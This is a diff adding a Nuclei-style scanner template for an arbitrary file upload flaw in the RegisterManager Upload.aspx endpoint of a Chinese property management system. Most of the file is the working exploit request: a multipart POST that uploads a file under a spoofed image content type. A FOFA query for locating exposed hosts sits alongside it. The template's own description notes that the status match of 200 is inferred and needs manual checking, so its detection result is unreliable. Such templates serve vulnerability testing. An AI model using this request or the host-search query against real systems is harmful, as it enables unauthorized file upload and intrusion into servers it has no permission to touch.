@@ -1,0 +1,47 @@
+id: poc-ra0m35twhh18m0oo
+info:
+  name: 新视窗新一代物业管理系统RegisterManager存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ra0m35twhh18m0oo
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ra0m35twhh18m0oo
+    fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
+http:
+- raw:
+  - 'POST /OfficeManagement/RegisterManager/Upload.aspx HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+
+    Cookie: JSESSIONID=FC2204F3698D2A07CDE9786055A071CB
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 147
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="1.txt"
+
+    Content-Type: image/jpg
+
+
+    123
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
